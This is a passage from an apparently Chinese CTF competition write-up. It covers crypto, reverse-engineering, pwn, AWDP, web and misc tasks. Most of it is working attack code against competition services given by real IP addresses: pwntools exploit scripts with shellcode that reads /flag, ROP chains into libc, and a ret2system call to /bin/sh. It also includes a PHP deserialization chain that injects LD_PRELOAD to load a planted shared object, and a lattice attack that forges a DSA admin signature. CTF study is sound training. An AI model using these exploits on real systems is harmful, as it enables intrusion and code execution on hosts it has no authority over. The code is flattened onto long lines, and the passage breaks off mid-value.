67999012738218701522977745292109516246796839155910592855105830602143310667902, 69578685261396434570248312667766841687942842366772423045805690348363579870605, 70138755870390268278868165128339271231922657556544777400641203083834855251118, 73103831846627154164474136146117846817277939030067244588920096997142184355333] print(As==Ks)
 IV = sha256(str(int(sum(Ks))).encode()).digest()[:16] print("IV=",IV) aes = AES.new(key,AES.MODE_CBC,iv=IV) print(aes.decrypt(enc)) #print("a=",sorted(a)) print()
 find, recovered_a = ns_attack_2Lx(h, m, n, M, range(2,32,4)) if find: #print(f"[+] check {sorted(a) == sorted(recovered_a)}") print("sa=",sorted(recovered_a)) print(len(recovered_a))         print()

flag{2024_1s_a_G00d_year_My_b3st_w1shes_fOr_ctfers}

04

Re

1

snack

pycdc 解 pyc

# Source Generated with Decompyle++# File: snack.pyc (Python 3.8)
import pygameimport randomimport key
def initialize(key): key_length = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % key_length]) % 256 S[i] = S[j] S[j] = S[i] return S

def generate_key_stream(S, length): i = 0 j = 0 key_stream = [] for _ in range(length): i = (i + 1) % 256 j = (j + S[i]) % 256 S[i] = S[j] S[j] = S[i] key_stream.append(S[(S[i] + S[j]) % 256]) return key_stream

def decrypt(data, key): S = initialize(key) key_stream = generate_key_stream(S, len(data)) decrypted_data = None((lambda .0 = None: [ i ^ data[i] ^ key_stream[i] for i in .0 ])(range(len(data)))) # rc4 多异或 一个 i return decrypted_data
pygame.init()WINDOW_WIDTH = 800WINDOW_HEIGHT = 600SNAKE_SIZE = 20SNAKE_SPEED = 20WHITE = (255, 255, 255)BLACK = (0, 0, 0)RED = (255, 0, 0)window = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))pygame.display.set_caption('贪吃蛇')font = pygame.font.Font(None, 36)snake = [ (200, 200), (210, 200), (220, 200)]snake_direction = (SNAKE_SPEED, 0)food = ((random.randint(0, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(0, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE)key_bytes = bytes((lambda .0: [ ord(char) for char in .0 ])(key.xor_key))data = [ 101, 97, 39, 125, 218, 172, 205, 3, 235, 195, 72, 125, 89, 130, 103, 213, 120, 227, 193, 67, 174, 71, 162, 248, 244, 12, 238, 92, 160, 203, 185, 155]decrypted_data = decrypt(bytes(data), key_bytes)running = Trueif running: window.fill(BLACK) for event in pygame.event.get(): if event.type == pygame.QUIT: running = False elif event.type == pygame.KEYDOWN or event.key == pygame.K_UP: snake_direction = (0, -SNAKE_SPEED) elif event.key == pygame.K_DOWN: snake_direction = (0, SNAKE_SPEED) elif event.key == pygame.K_LEFT: snake_direction = (-SNAKE_SPEED, 0) elif event.key == pygame.K_RIGHT: snake_direction = (SNAKE_SPEED, 0) continue snake_head = (snake[0][0] + snake_direction[0], snake[0][1] + snake_direction[1]) snake.insert(0, snake_head) snake.pop() if snake[0] == food: food = ((random.randint(0, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(0, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE) snake.append(snake[-1]) if snake[0][0] < 0 and snake[0][0] >= WINDOW_WIDTH and snake[0][1] < 0 and snake[0][1] >= WINDOW_HEIGHT or snake[0] in snake[1:]: running = False for segment in snake: pygame.draw.rect(window, WHITE, (segment[0], segment[1], SNAKE_SIZE, SNAKE_SIZE)) pygame.draw.rect(window, RED, (food[0], food[1], SNAKE_SIZE, SNAKE_SIZE)) score_text = font.render(f'''Score: {len(snake)}''', True, WHITE) speed_text = font.render(f'''Speed: {SNAKE_SPEED}''', True, WHITE) window.blit(score_text, (10, 10)) window.blit(speed_text, (10, 40)) score = len(snake) if score >= 9999: flag_text = font.render('Flag: ' + decrypted_data.decode(), True, WHITE) window.blit(flag_text, (10, 70)) pygame.display.update() pygame.time.Clock().tick(10) continuepygame.quit()

拿key

from Crypto.Cipher import ARC4
key = b'V3rY_v3Ry_Ez'
data = [ 101, 97, 39, 125, 218, 172, 205, 3, 235, 195, 72, 125, 89, 130, 103, 213, 120, 227, 193, 67, 174, 71, 162, 248, 244, 12, 238, 92, 160, 203, 185, 155]rc4 = ARC4.new(key)
flag =rc4.decrypt(bytes(data))for i in range(len(flag)): print(chr(flag[i]^i),end='')

2

BEDTEA

简单的TEA只不过每次的key会改变

时间检测反调试,xor 0x33

解密逻辑: 将密文 xor 0x33 -> 倒叙-> TEA

enc = [118, 113, 157, 231, 112, 119, 63, 163, 2, 241, 141, 201, 2, 198, 162, 75, 186, 25, 86, 5, 242, 137, 94, 224]for i in enc: print(hex(i ^ 0x33),end=',')

调试获取每次的key解密三次就行

#include<stdio.h>#include<stdlib.h>#include<stdint.h>

int main(){ unsigned char enc[] = { 211, 109, 186, 193, 54, 101, 42, 137, 120, 145, 245, 49, 250, 190, 194, 49, 144, 12, 68, 67, 212, 174, 66, 69 }; uint32_t* data = (uint32_t*)enc; uint32_t v15 = 0; uint32_t v13 = 0; uint32_t v14 = 0; for (int i = 0; i < 2; i+=2) { v15 = data[i]; v13 = data[i + 1]; v14 = -0x61CBB648 * 22; for (int j = 0; j < 22; j++) { v13 -= (v14 + v15) ^ (13 + (v15 >> 4)) ^ (8 + 32 * v15); v15 -= (v14 + v13) ^ (5 + (v13 >> 4)) ^ (3 + 32 * v13); v14 += 0x61CBB648; } data[i] = v15; data[i + 1] = v13; } printf("%s", enc);}

flag{y0u_reallyl1ke_te@}

3

HardSignin

分别为 TlsCallback 0 – 3 ,对main函数SMC自解密并设置随机数种子

打乱BASE码表再次设置随机数种子

生成RC4的和TEA的key

交叉引用全局变量找到加密逻辑

#include <stdio.h>#include <string.h>#include <stdint.h>#include <stdlib.h>
void TeaDecrypt(uint32_t *input, uint32_t *key) { unsigned int j; // [esp+4Ch] [ebp-18h] unsigned int v5; // [esp+54h] [ebp-10h] unsigned int v6; // [esp+58h] [ebp-Ch] unsigned int v7; // [esp+5Ch] [ebp-8h]
 for (int i = 0; i < 16; i += 2) { v7 = input[i]; v6 = input[i + 1]; v5 = 0x9E3779B9 * 0x64; for (int j = 0; j < 0x64; j++) { v6 -= (key[(v5 >> 11) & 3] + v5) ^ (v7 + ((v7 >> 5) ^ (16 * v7))); v5 += 0x61C88647; v7 -= (key[v5 & 3] + v5) ^ (v6 + ((v6 >> 5) ^ (16 * v6))); } input[i] = v7; input[i + 1] = v6; }
}
int main(){
 srand(0x1919810u); uint32_t enc[] = { 3036486489, 3653154923, 3598177203, 408905200, 1396350368, 645614189, 1318861428, 3625534240, 3046501746, 1445070236, 2433841867, 213678751, 3463276874, 699118653, 845347425, 3058494644 }; unsigned char rc4[16] = { 0 }; unsigned char tea[16] = { 0 }; for (int i = 0; ; ++i) { if (i >= 16) break; rc4[i] = rand() % 255; tea[i] = rand() % 255; }
 TeaDecrypt(enc, (uint32_t*)tea); unsigned char* temp = (unsigned char*)enc; for (int i = 0; i < 64; i++) { printf("%d,", temp[i]); } printf("n"); for (int i = 0; i < 16; i++) { printf("%d,", (uint8_t)rc4[i]); } return 0;}

RC4解密得到base加密的结果

from Crypto.Cipher import ARC4
key = bytes([118,137,51,73,25,19,195,199,173,216,228,104,252,72,4,188])enc = [188,237,0,123,134,244,22,147,149,249,135,220,103,168,162,127,77,226,98,159,123,52,174,233,69,3,126,53,66,208,139,112,240,251,46,199,221,233,185,115,227,204,26,117,173,220,253,20,168,200,69,22,49,110,42,8,44,15,29,159,7,186,213,239]rc4 = ARC4.new(key)print(rc4.decrypt(bytes(enc)))

05

Pwn

1

Shuffled_Execution

from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)rl = lambda :io.recvline()ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('8.147.128.163',29611) else: return process([binary] + argv, *a, **kw)

binary = './Shuffled_Execution'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''#continuebrva 0x001560'''.format(**locals())
io = start(binary)
#gdb.attach(io,gdbscript)pay = b'xebx00' # jmp # x00 截断绕过pay += b'x90' * 0x20pay += asm('add rax,0x800')pay += asm('mov rsp,rax')pay += asm(shellcraft.openat(-100,'/flag'))pay += asm(shellcraft.mmap(0,0x50,7,2,3,0))pay += asm('push 0x60')pay += asm('push rax')pay += asm(shellcraft.writev(1,'rsp',1))sl(pay)
io.interactive()

2

SavethPrincess

from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)rl = lambda :io.recvline()ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('8.147.128.163',28575) else: return process([binary] + argv, *a, **kw)

binary = './SavethePrincess'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''brva 0x000000170Cbrva 0x0166A#continue'''.format(**locals())
io = start(binary)

def magic(data): ru('> n') sl('1') ru('password: n') s(data)

pwd = []over = 0for i in range(8): if over: break for c in range(ord('a'),ord('z')+1): pay = bytes(pwd) + p8(c) pay = pay.ljust(0xA, b'A') magic(pay) d = r(len('you password is')) if b'is' in d: pass else: over = 1 pwd.append(c) print(bytes(pwd)) break #io.recvuntil(' is ',timeout=2) x = ru('n,') print(x) if x[-1] == (i+1): pwd.append(c) print(bytes(pwd)) break print(bytes(pwd))
print(bytes(pwd))

pay = f'%{6+0x7}$p-%{6+9}$p%10$p-'s(pay)ru('0x')can = int(ru('-'),16)ru('0x')libc_base = int(ru('0x'),16) - 171408stack = int(ru('-'),16)
lss('can')lss('libc_base')lss('stack')

ru('> n')sl('2')ru('Attack the dragon!!n')libc.address = libc_baserax = libc_base + 0x0000000000045eb0 #: pop rax ; retrdi = libc_base + 0x000000000002a3e5 #: pop rdi ; retrsi = libc_base + 0x000000000002be51 #: pop rsi ; retrdx = libc_base + 0x000000000011f2e7 #: pop rdx ; pop r12 ; retrcx = libc_base + 0x000000000003d1ee #: pop rcx ; retr8 = libc_base + 0x00000000001659e6 #: pop r8 ; mov eax, 1 ; retr13 = libc_base + 0x0000000000041c4a #: pop r13 ; retr9 = libc_base + 0x00000000000d39d9 #: mov r9, qword ptr [rsp + 0x10] ; call r13 # 虽然 压了一个栈，但是由于减去后 会执行到 sub,rsp, 也会调整栈，r10 = libc_base + 0x0000000000115af4 # mov r10, rcx ; mov eax, 0x104 ; syscall # 这样的也可以用，syscal 执行后不会修改 r10 的值pay = b'flag' + 0x34 * b'x00'pay += p64(can) * 2
pay += p64(rdi)pay += p64((1<<64)-100)pay += p64(rsi)pay += p64(stack-96)pay += p64(libc.sym['openat'])
pay += p64(rcx)pay += p64(2)pay += p64(r10)pay += p64(rdi)pay += p64(0x1000)pay += p64(rsi)pay += p64(0x50)pay += p64(rdx)pay += p64(7) * 2pay += p64(r8)pay += p64(3)pay += p64(rax)pay += p64(9)pay += p64(r13)pay += p64(libc.sym['read']+74) // syscal， add rsp 然后会调整stackpay += p64(r9)pay += p64(0) * 4
pay += p64(rdi)pay += p64(1)pay += p64(rsi)pay += p64(0x10000)pay += p64(rdx)pay += p64(0x50) * 2pay += p64(libc.sym['write'])

#gdb.attach(io,gdbscript)sl(pay)#
io.interactive()

3

stdout

和 2024ciscn华北的where is my stdout题很像,用同样的方法 ret2dlresolve 本地可以用，远程不行，使用只能换个方法做。

from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)rl = lambda :io.recvline()ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: #return remote('8.147.128.163', 34043) return remote('8.147.128.54',26858) else: return process([binary] + argv, *a, **kw)

binary = './pwn'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''#continueb *0x401286'''.format(**locals())
io = start(binary)

#gdb.attach(io,gdbscript)

pay = b'A' *0x50 +p64(0x404000+0x800)+ p64(0x401269)s(pay)
pause()
read_plt = elf.plt['read']read_got = elf.got['read']rdi = 0x00000000004013d3 # pop rdi ; retrsi = 0x00000000004013d1 # pop rsi ; pop r15 ; ret
magic = 0x00000000004011fc # add dword ptr [rbp - 0x3d], ebx ; nop ; retbss = 0x404000
csu1 = 0x4013CAcsu2 = 0x4013B0

libc = elf.libcmprotect = libc.sym['mprotect']_IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']offset = 0x10000000000000000 - (_IO_2_1_stdout_ - mprotect)target = _IO_2_1_stdout_ + 0x3d
pay = b'A' * 0x28pay += p64(0x4013CA)pay += p64(offset)pay += p64(0x0404070+0x3d)pay += p64(0) * 4pay += p64(magic)
pay += p64(csu1)pay += p64(0) # rbxpay += p64(1) # rbppay += p64(bss) # rdipay += p64(0x1000) # rsipay += p64(0x7) # rdxpay += p64(0x0404070) # mprotectpay += p64(csu2)pay += p64(0x42) * 7pay += p64(0x4048c8) # leave retpay += b'x90' * 0x10pay += asm(shellcraft.open('flag'))pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
sl(pay)
io.interactive()

06

AWDP—spiiill

1

spiiill

Break

from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('39.106.48.123',43273) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './pwn'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''brva 0x001CD9#continue'''.format(**locals())
io = start(binary)

ru(':')sl('2')ru('you')pay = cyclic(0x400)pay = fit({ 0:0xa, 8:0xC, 0x10:-1022, }) + b'////bin/shx00';sl(pay)#gdb.attach(io,gdbscript)sl('3')
itr()

Fix

2

simpleSys

Break

login 时，把 password 填满，base64 加密后，会把原本的密码第一个字节清空。

from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('8.147.128.22', 25823) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './main'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''brva 0x1600brva 0x0014CBbrva 0x00014FA#continue'''.format(**locals())
io = start(binary)

def up(name,pwd): ru(': ') sl('1') ru('username: ') s(name) ru(': ') s(pwd)
def login(name,pwd): ru(': ') sl('2') ru('username: ') s(name) ru(': ') s(pwd)
def add(l): ru('> ') sl('3') ru(': ') sl(str(l))

up('A'*0x24,'P'*0x24)
#gdb.attach(io,gdbscript)login('root'.ljust(0x24,'x00'),'this is passwordx01'.ljust(0x24,'xAA'))

ru(': ')sl('3')ru(': ')sl(str(0x38))pause()s('A'*0x38)
ru('A'*0x38)libc_base = uu64(r(6)) - 276052

system = libc_base + libc.sym['system']rdi = libc_base + next(libc.search(asm('pop rdi;ret')))bin_sh = libc_base + next(libc.search(b'/bin/sh'))
lss('libc_base')
ru('[')sl('y')
ru(': ')sl('3')ru(': ')sl('-3')
pause()pay = b'A' * 0x68pay += p64(rdi+1) + p64(rdi) + p64(bin_sh) + p64(system)sl(pay)ru('[')sl('y')#itr()

Fix

3

simplegood

Fix

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
<?phpfunction filter($a){ $pattern = array(''', '"','%','(',')',';','bash'); $pattern = '/' . implode('|', $pattern) . '/i'; if(preg_match($pattern,$a)){ die("No injecting!!!"); } return $a;}class ENV{ public $key; public $value; public $math;
}class DIFF{ public $callback; public $back; private $flag;
}class FILE{ public $filename; public $enviroment;}class FUN{ public $fun; public $value;}

$e = new ENV();$e->math = new DIFF();$e->math->callback = new FILE();$e->math->callback->enviroment = new ENV();$e->math->callback->enviroment->key = "LD_PRELOAD";$e->math->callback->enviroment->value = "/tmp/fd1db20b118ef097af40bd312c32417e.so";echo urlencode(serialize($e));///tmp/ffdbcd469369686d0aeb664eca2a64e7.so///tmp/166dbdc87bcc964771cee85c8ffb1184.so// $e = new ENV();// $e->math = new DIFF();// $e->math->callback = new FUN();// $e->math->callback->fun = new FILE();// $e->math->callback->value = base64_encode(file_get_contents('1.so'));// $e->math->callback->fun->filename = "1.so";// echo urlencode(serialize($e));?>
```



```
def exp1(): import subprocess from pwn import pause f = 'class.py' link = [] # b"class _377AbcaF(): def _1459BC58(self): if -9462 < 3956: os.system('cat /flag')" cmd = 'system' while(1): io = subprocess.Popen(['/bin/sh','-c',f'cat class.py |grep {cmd} -B3'], stdout=subprocess.PIPE) data = io.stdout.read().replace(b'rn',b'').decode().split() #if data == b'': if data[1] == '_O0():': open('link','w').write(str(link[::-1])) pause() exit(0) cl = data[1][:-3] de = data[3][:-7] print(data) cmd = cl + '.' + de link.append(cmd) #print(link)

mdata = eval(open('link','r').read())[::-1][1:]print(len(mdata))
d = []#for i in range(30):for i in range(len(mdata)): #print(mdata[i]) #d.append(mdata[i][:-10][1:])
 d.append(mdata[i].replace('O','0').replace('_','').replace('.','')[:-8]) #print(mdata[i].replace('O','0').replace('_','').replace('.',''))
 #d.append(mdata[i].replace('O','0').replace('_','')[-8:]) #print(mdata[i].replace('O','0').replace('_','')[-8:])
 #d.append(mdata[i][-8:])
d = ''.join(d)open('data.7z','wb').write(bytes.fromhex(d))###import hashlib
#x = hashlib.md5(''.join(d).replace('.','').encode()).hexdigest()#print(x)
```



```
p = getPrime(256)a = getPrime(256)b = getPrime(256)E = EllipticCurve(GF(p),[a,b])m = E.random_point()G = E.random_point()k = getPrime(18)K = k * Gr = getPrime(256)c1 = m + r * K
c2 = r * G
cipher_left = s2n(flag[:len(flag)//2]) * m[0] #flag的前半部分乘m[0]，所以只要用密文的除于m[0]即可得到flag前半部分cipher_right = s2n(flag[len(flag)//2:]) * m[1]   #flag的后半部分点乘m[1]
```



```
p = koZP3YQAklARRNrmYfjxoKIAXegOcG4jMOmKb08uESOkCCn72d6UM2NWgefYPEMq4EJ1M0jKaqt02Guo5Ubccjqg4QZaaHbScREx38UMLQKwG0LcDd8VFX1zkobc1ZQn4L3DhKQrgJZI55todgOdJuHN532bxScAvOF26gJyQclPtRHn3M6SHrRCEXzzmszd68PJlLB6HaabrRrCW9ZoAYSZetM5jDBtNCJLpR0CBZUUk3Oeh2MZQu2vk8DZ1QqNG49hlxGfawp1FXvAZPdMwixzkhEQnbCDcOKzYyT6BZF2Dfd940tazl7HNOswuIpLsqXQ2h56guGngMeYfMXEZV09fsB3TE0N934CLF8TbZnzFzEkOe8TPTK2mWPVSrgmbsGHnxgYWhaRQWg3yosgDfrEa5qfVl9De41PVtTw024gltovypMXK5XMhuhogs0EMN7hkLapLn6lMjp的格式为p={p}
a = 87425770561190618633288232353256495656281438408946725202136726983601884085917b = 107879772066707091306779801409109036008421651378615140327877558014536331974777K = (49293150360761418309411209621405185437426003792008480206387047056777011104939 : 43598371886286324285673726736628847559547403221353820773139325027318579443479)G = (34031022567935512558184471533035716554557378321289293120392294258731566673565 : 74331715224220154299708533566163247663094029276428146274456519014761122295496)私钥k小于1000000c1 = (3315847183153421424358678117707706758962521458183324187760613108746362414091 : 61422809633368910312843316855658127170184420570309973276760547643460231548014)c2 = (12838481482175070256758359669437500951915904121998959094172291545942862161864 : 60841550842604234546787351747017749679783606696419878692095419214989669624971)cipher_left = 75142205156781095042041227504637709079517729950375899059488581605798510465939cipher_right = 61560856815190247060747741878070276409743228362585436028144398174723191051815
```



```
from sage.all import *from Crypto.Util.number import *from tqdm import *from gmpy2 import *
a = 87425770561190618633288232353256495656281438408946725202136726983601884085917b = 107879772066707091306779801409109036008421651378615140327877558014536331974777K = (49293150360761418309411209621405185437426003792008480206387047056777011104939,43598371886286324285673726736628847559547403221353820773139325027318579443479)G = (34031022567935512558184471533035716554557378321289293120392294258731566673565,74331715224220154299708533566163247663094029276428146274456519014761122295496)c1 = (3315847183153421424358678117707706758962521458183324187760613108746362414091,61422809633368910312843316855658127170184420570309973276760547643460231548014)c2 = (12838481482175070256758359669437500951915904121998959094172291545942862161864,60841550842604234546787351747017749679783606696419878692095419214989669624971)cipher_left = 75142205156781095042041227504637709079517729950375899059488581605798510465939cipher_right = 61560856815190247060747741878070276409743228362585436028144398174723191051815
f1 = G[0]^3+a*G[0]+b-G[1]^2f2 = c1[0]^3+a*c1[0]+b-c1[1]^2p = gcd(int(f1),int(f2))print(p)print(isPrime(p))print(len(bin(p)))
E = EllipticCurve(GF(p),[a,b])C1 = E(c1)C2 = E(c2)for k in tqdm(range(166000,1000000)): m = C1 - k*C2 left = cipher_left*invert(int(m[0]),int(p))%int(p) right = cipher_right*invert(int(m[1]),int(p))%int(p) if b'flag{' in long_to_bytes(int(left)): print(k) print(long_to_bytes(int(left))) print(long_to_bytes(int(right)))        break
```



```
Flag: flag{2d6a7e4e-02d3-11ef-8836-a4b1c1c5a2d2}
```



```
import osimport hashlibfrom Crypto.Util.number import *from Crypto.PublicKey import DSAimport randomdef gen_proof_key(): password = 'happy_the_year_of_loong' getin = '' for i in password: if random.randint(0, 1): getin += i.lower() else: getin += i.upper() ans = hashlib.sha256(getin.encode()).hexdigest() return getin,ans
def gen_key(): pri = random.randint(2,q - 2) pub = pow(g,pri,p) return pri,pub
def sign(m,pri): k = int(hashlib.md5(os.urandom(20)).hexdigest(),16) H = int(hashlib.sha256(m).hexdigest(),16) r = pow(g,k,p) % q s = pow(k,-1,q) * (H + pri * r) % q return r,s
def verify(pub,m,signature): r,s = signature if r <= 0 or r >= q or s <= 0 or s >= q: return False w = pow(s,-1,q) H = int(hashlib.sha256(m).hexdigest(),16) u1 = H * w % q u2 = r * w % q v = (pow(g,u1,p) * pow(pub,u2,p) % p) % q return v == r
def login(): print('Hello sir,Plz login first') menu = ''' 1.sign 2.verify 3.get my key ''' times = 8 while True: print(menu) if times < 0: print('Timeout!') return False choice = int(input('>')) if choice == 1: name = input('Username:').encode() if b'admin' in name: print('Get out!') return False r,s = sign(name,pri) print(f'This is your signature -- > {r},{s}') times -= 1 elif choice == 2: print('Sure,Plz input your signature') print(pri) r = int(input('r:')) s = int(input('s:')) if verify(pub,b'admin',(r,s)) == True: print('login success!') return True else: print('you are not admin') return False elif choice == 3: print(f'Oh,your key is {(p,q,g)}')getin,ans = gen_proof_key()print(f'Your gift --> {ans[:6]}')your_token = input('Plz input your tokenn>')if your_token != getin: print('Get out!') exit(0)
key = DSA.generate(1024)p, q, g = key.p, key.q, key.gpri, pub = gen_key()if login() == False: exit(0)print(open('/flag','r').read())
```



```
from pwn import *import itertoolsfrom tqdm import tqdmimport hashlibimport osimport hashlibfrom Crypto.Util.number import *from Crypto.PublicKey import DSAfrom random import choicesimport stringfrom gmpy2 import *
# nc 8.147.128.163 18401# nc 8.147.128.22 31575# nc 8.147.128.163 42487# nc 39.106.48.123 39979# nc 8.147.132.12 21188
def pass_proof(head): password = 'happytheyearofloong' table = itertools.product([0,1],repeat=19) for i in tqdm(table): getin = '' for j in range(len(i)): if i[j] == 0: getin += password[j].lower() else: getin += password[j].upper() msg =getin[:5]+"_"+getin[5:8]+"_"+getin[8:12]+"_"+getin[12:14]+"_"+getin[14:] h = hashlib.sha256(msg.encode()).hexdigest() if h[:6] == head: print(msg) return msg
def sign(pubkey, x, msg, k): p, q, g = pubkey r = int(pow(g, k, p)) % q Hm = int(hashlib.sha256(msg).hexdigest(),16) s = (Hm + x * r) * inverse(k, q) % q return (r, s)
table = string.ascii_lowercase
io = remote('8.147.132.12', '21188')s1,s2 = io.recv().strip().split(b'-->')s2 = s2.strip().decode()print("s2=",s2)
ss = pass_proof(s2)print("ss=",ss)io.sendlineafter(b'>',ss)io.sendlineafter(b'>',b'3')#print(io.recv())
s3 = io.recv().strip().replace(b'n',b'')print(s3)s5 = s3.replace(b'Oh,your key is ',b'')print(s5)(p,q,g)=eval(s5)print("p=",p)print("q=",q)print("g=",g)
#io.interactive()#io.interactive()
R = []S = []H = []for i in range(8): io.recvuntil(b">") io.sendline(b"1") io.recvuntil(b"Username:") m = "".join(choices(table,k=16)) msg = m.encode() h = int(hashlib.sha256(msg).hexdigest(),16) io.sendline(msg) io.recvuntil(b"This is your signature -- > ") data1 = eval(io.recvline().decode().strip()) r,s = data1 #print(r,s) S.append(s) R.append(r) H.append(h)
print("R=",R)n = len(S)r0 = R[0]s0 = S[0]h0 = H[0]pubkey = (p,q,g)
A = []B = []
for i in range(1,len(R)): a = R[i]*s0 *invert(r0*S[i],q) % q b = (r0*H[i] - R[i]*h0)*invert(r0*S[i],q) % q A.append(a) B.append(b)
n = len(A)Ge = Matrix(ZZ,n+2,n+2)for i in range(n): Ge[i,i] = q Ge[-2,i] = A[i] Ge[-1,i] = B[i]
K = 2**128Ge[-2,-2] = 1Ge[-1,-1] = K
for line in Ge.BKZ(block_size=30): if abs(line[-1]) == K: k0 = line[-2] d = (k0 * s0 - h0) * invert(r0,q) % q print("d=",d) sig = sign(pubkey,d,b'admin',k0) r,s = sig io.recvuntil(b">") io.sendline(b"2") io.sendlineafter(b"r:",str(r).encode()) io.sendlineafter(b"s:",str(s).encode())
io.interactive()
```



```
Flag: flag{7b640bd1-367c-4c8e-b656-315e7596ad85}
```



```
from Crypto.Util.number import *
CBC_key = b''
p,q = getPrime(512),getPrime(512)n = p * qN = n**2 + 2024hint = (pow(3, 2022, N) * p**2 + pow(5, 2022, N) * q**2) % Nc = pow(bytes_to_long(CBC_key), 65537, n)
print('n =', n)print('h =', hint)print('c =', c)
'''n = 104765768221225848380273603921218042896496091723683489832860494733817042387427987244507704052637674086899990536096984680534816330245712225302233334574349506189442333792630084535988347790345154447062755551340749218034086168589615547612330724516560147636445207363257849894676399157463355106007051823518400959497h = 7203581190271819534576999256270240265858103390821370416379729376339409213191307296184376071456158994788217095325108037303267364174843305521536186849697944281211331950784736288318928189952361923036335642517461830877284034872063160219932835448208223363251605926402262620849157639653619475171619832019229733872640947057355464330411604345531944267500361035919621717525840267577958327357608976854255222991975382510311241178822169596614192650544883130279553265361702184320269130307457859444687753108345652674084307125199795884106515943296997989031669214605935426245922567625294388093837315021593478776527614942368270286385c = 